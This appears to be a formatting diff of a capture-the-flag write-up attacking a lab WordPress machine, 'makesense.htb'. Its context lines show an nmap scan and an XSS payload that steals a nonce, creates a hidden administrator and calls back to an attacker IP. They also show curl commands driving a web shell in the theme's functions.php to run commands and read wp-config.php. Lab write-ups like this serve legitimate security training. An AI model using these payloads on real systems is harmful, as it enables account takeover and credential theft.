@@ -18,7 +18,7 @@ nmap -p22,443 -sV 10.129.35.140
 
 **Output:**
 
-{% code overflow="wrap" %}
+
 ```shellscript
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-06 14:59 -0400
 Nmap scan report for makesense.htb (10.129.36.71)
@@ -44,7 +44,7 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 30.05 seconds
 ```
-{% endcode %}
+
 
 **Domain:** `makesense.htb`, **CMS:** WordPress 7.0, **Theme:** webagency
 
@@ -136,7 +136,7 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 
 Injected payload to steal the WordPress nonce and silently create an administrator account:
 
-{% code overflow="wrap" %}
+
 ```html
 <img src=x onerror="fetch('/wp-admin/user-new.php',{credentials:'include'}).then(r=>r.text()).then(h=>{
 n=(h.match(/name=&quot;_wpnonce_create-user&quot;[^>]*value=&quot;([a-f0-9]+)&quot;/)||h.match(/id=&quot;_wpnonce_create-user&quot;[^>]*value=&quot;([a-f0-9]+)&quot;/)||[])[1];
@@ -155,7 +155,7 @@ fetch('/wp-admin/user-new.php',{method:'POST',credentials:'include',headers:{'Co
 new Image().src='http://10.10.14.133:8080/done?s='+r.status})
 })">
 ```
-{% endcode %}
+
 
 **Admin login created:**
 
@@ -194,11 +194,11 @@ curl -k "https://makesense.htb/wp-content/themes/webagency/functions.php?cmd=id"
 
 Use RCE to read `wp-config.php`:
 
-{% code overflow="wrap" %}
+
 ```bash
 curl -ks "https://makesense.htb/wp-content/themes/webagency/functions.php?cmd=cat%20/var/www/html/wp-config.php"
 ```
-{% endcode %}
+
 
 **Output:**
 
